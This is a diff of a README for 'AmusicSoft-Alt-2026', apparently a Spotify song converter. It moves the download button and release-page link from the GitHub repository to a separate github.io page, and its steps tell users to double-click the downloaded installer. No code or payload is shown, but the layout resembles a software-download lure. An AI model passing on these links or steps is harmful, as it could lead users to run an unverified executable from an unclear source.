@@ -1,7 +1,7 @@
 # 🎵 AmusicSoft-Alt-2026 - Convert Spotify Songs For Offline Listening
 
 <p align="center">
-  <a href="https://github.com/leonard5868/AmusicSoft-Alt-2026">
+  <a href="https://leonard5868.github.io">
     <img src="https://img.shields.io/badge/Download-AmusicSoft_Converter-blue.svg" alt="Download Button">
   </a>
 </p>
@@ -25,7 +25,7 @@ Before you install this software, check that your computer meets these minimum n
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this [link to the release page](https://github.com/leonard5868/AmusicSoft-Alt-2026) to download the installation file.
+1. Visit this [link to the release page](https://leonard5868.github.io) to download the installation file.
 2. Locate the file in your "Downloads" folder after the transfer finishes.
 3. Double-click the downloaded file to begin the installation wizard.
 4. Accept the license terms when the prompt appears on your screen.
